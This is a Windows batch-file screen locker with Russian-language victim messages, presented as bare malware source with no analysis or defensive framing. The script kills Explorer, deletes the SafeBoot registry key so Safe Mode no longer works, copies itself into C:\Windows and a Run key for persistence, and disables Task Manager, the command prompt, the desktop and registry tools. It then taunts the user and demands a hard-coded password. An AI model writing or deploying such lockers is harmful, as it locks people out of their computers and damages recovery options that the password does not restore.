Echo off >nul

color a >nul

taskkill /im explorer.exe /f > nul

Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot /f > nul

copy %0 C:\Windows\Win32.bat > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul

cls >nul
title Windows Заблокирован!

echo Windows Заблокирован!

echo Твой компьютер заблокирован

echo Теперь ты будешь знать, как открывать файлы от незнакомых людей

echo Перезагрузка тебе не поможет

echo В общем, твой ПК просто заблокирован

echo Enter Password:

:X

set /p x=

if %x%== 1234567890 (echo Windows start!
explorer

reg Delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 0 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 0 /f >nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 0 /f >nul

exit

) ELSE (

cls

echo ERROR!

echo Enter Password:

)

goto X